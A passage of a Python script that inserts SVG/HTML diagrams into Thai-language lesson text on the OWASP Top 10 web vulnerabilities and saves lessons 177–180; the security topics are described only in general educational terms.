<text x="60" y="79" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle" font-weight="bold">  // Fails open! (No halt)</text>
</g>
<path d="M300,70 L350,70" fill="none" stroke="#34d399" stroke-width="1.2"/>
<polygon points="350,70 344,66 344,74" fill="#34d399"/>
<g transform="translate(360, 45)">
<rect x="0" y="0" width="70" height="50" rx="4" fill="#0f1322" stroke="#34d399" stroke-width="1.2"/>
<text x="35" y="18" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">Access Allowed</text>
<text x="35" y="32" fill="#34d399" font-size="7" font-family="monospace" text-anchor="middle">Auth check skipped</text>
<text x="35" y="42" fill="#34d399" font-size="7" font-family="monospace" text-anchor="middle">due to error</text>
</g>
</svg>
</div>"""

# Parse baseline val177_0 and replace text slide placeholders with flattened HTML/SVGs.
# We will do this safely using exact text search.

# A01
val177_0_rich = val177_0_rich.replace(
    "- การปลอมแปลงค่า JSON Web Token (JWT) เพื่อยกระดับสิทธิ์ตัวเอง",
    f"- การปลอมแปลงค่า JSON Web Token (JWT) เพื่อยกระดับสิทธิ์ตัวเอง\n\n{HTML_A01}"
)

# A02
val177_0_rich = val177_0_rich.replace(
    "- การปล่อยให้เปิดใช้งานระบบดีบั๊กในโหมด Production ทำให้หน้าเว็บแสดงรหัสผ่านหรือ stack trace ยาวเหยียดเมื่อระบบเอเรอร์",
    f"- การปล่อยให้เปิดใช้งานระบบดีบั๊กในโหมด Production ทำให้หน้าเว็บแสดงรหัสผ่านหรือ stack trace ยาวเหยียดเมื่อระบบเอเรอร์\n\n{HTML_A02}"
)

# A03
val177_0_rich = val177_0_rich.replace(
    "- การเรียกใช้งาน NPM, Pip หรือ Composer package ที่ถูกแฮกเกอร์แอบอัปเดตเวอร์ชันใหม่ประสงค์ร้ายเพื่อส่งขโมยตัวแปรระบบ (.env) ออกไป",
    f"- การเรียกใช้งาน NPM, Pip หรือ Composer package ที่ถูกแฮกเกอร์แอบอัปเดตเวอร์ชันใหม่ประสงค์ร้ายเพื่อส่งขโมยตัวแปรระบบ (.env) ออกไป\n\n{HTML_A03}"
)

# A04
val177_0_rich = val177_0_rich.replace(
    "- การประยุกต์ใช้อัลกอริทึมเข้ารหัสโบราณที่มีลูปชนกันง่าย เช่น MD5, SHA-1 หรือกุญแจเข้ารหัสลับขนาดเล็กเกินไป",
    f"- การประยุกต์ใช้อัลกอริทึมเข้ารหัสโบราณที่มีลูปชนกันง่าย เช่น MD5, SHA-1 หรือกุญแจเข้ารหัสลับขนาดเล็กเกินไป\n\n{HTML_A04}"
)

# A05
val177_0_rich = val177_0_rich.replace(
    "  - **Command Injection**: การแทรกคำสั่ง Command Line เพื่อควบคุมสั่งการเซิร์ฟเวอร์ตรงๆ",
    f"  - **Command Injection**: การแทรกคำสั่ง Command Line เพื่อควบคุมสั่งการเซิร์ฟเวอร์ตรงๆ\n\n{HTML_A05}"
)

# A06
val177_0_rich = val177_0_rich.replace(
    "- ระบบยอมให้แก้ไขรหัสผ่านได้ทันทีโดยไม่ต้องกรอกรหัสผ่านเก่า เพื่อยืนยันตัวตน หรือการไม่มีฟังก์ชัน Rate Limiting ป้องกันการเดารหัสผ่านซ้ำๆ",
    f"- ระบบยอมให้แก้ไขรหัสผ่านได้ทันทีโดยไม่ต้องกรอกรหัสผ่านเก่า เพื่อยืนยันตัวตน หรือการไม่มีฟังก์ชัน Rate Limiting ป้องกันการเดารหัสผ่านซ้ำๆ\n\n{HTML_A06}"
)

# A07
val177_0_rich = val177_0_rich.replace(
    "- ระบบยอมรับรหัสผ่านที่สั้นและคาดเดาง่าย เช่น `123456` หรือการไม่มีระบบ Account Lockout เพื่อสั่งล็อกผู้ใช้งานชั่วคราวเมื่อเดารหัสผิดเกินกำหนด",
    f"- ระบบยอมรับรหัสผ่านที่สั้นและคาดเดาง่าย เช่น `123456` หรือการไม่มีระบบ Account Lockout เพื่อสั่งล็อกผู้ใช้งานชั่วคราวเมื่อเดารหัสผิดเกินกำหนด\n\n{HTML_A07}"
)

# A08
val177_0_rich = val177_0_rich.replace(
    "- การปล่อยให้ผู้ใช้ส่งข้อมูล serialize object ที่ปรับเปลี่ยนสิทธิ์เข้าไปทำงานโดยไม่ตรวจสอบ signature ความปลอดภัยก่อน",
    f"- การปล่อยให้ผู้ใช้ส่งข้อมูล serialize object ที่ปรับเปลี่ยนสิทธิ์เข้าไปทำงานโดยไม่ตรวจสอบ signature ความปลอดภัยก่อน\n\n{HTML_A08}"
)

# A09
val177_0_rich = val177_0_rich.replace(
    "- ระบบโดนทดสอบยิงรหัสผ่านล็อกอินเป็นหมื่นครั้ง แต่ไม่มีประวัติล็อกใดๆ บันทึกขึ้น ทำให้แฮกเกอร์โจมตีได้อย่างยาวนานโดยไม่ถูกตรวจพบ",
    f"- ระบบโดนทดสอบยิงรหัสผ่านล็อกอินเป็นหมื่นครั้ง แต่ไม่มีประวัติล็อกใดๆ บันทึกขึ้น ทำให้แฮกเกอร์โจมตีได้อย่างยาวนานโดยไม่ถูกตรวจพบ\n\n{HTML_A09}"
)

# A10
val177_0_rich = val177_0_rich.replace(
    "ส่งผลให้ข้ามขั้นตอนการยืนยันตัวตนหรืออนุญาตสิทธิ์เข้าถึงระบบไปอย่างง่ายดาย",
    f"ส่งผลให้ข้ามขั้นตอนการยืนยันตัวตนหรืออนุญาตสิทธิ์เข้าถึงระบบไปอย่างง่ายดาย\n\n{HTML_A10}"
)
save_lesson(177, val177_0_rich, val177_1, val177_2)
# --- End Lesson 177 Rich Graphics Integration ---

save_lesson(178, val178_0, val178_1, val178_2)
save_lesson(179, val179_0, val179_1, val179_2)
save_lesson(180, val180_0, val180_1, val180_2)
ctx.pop()
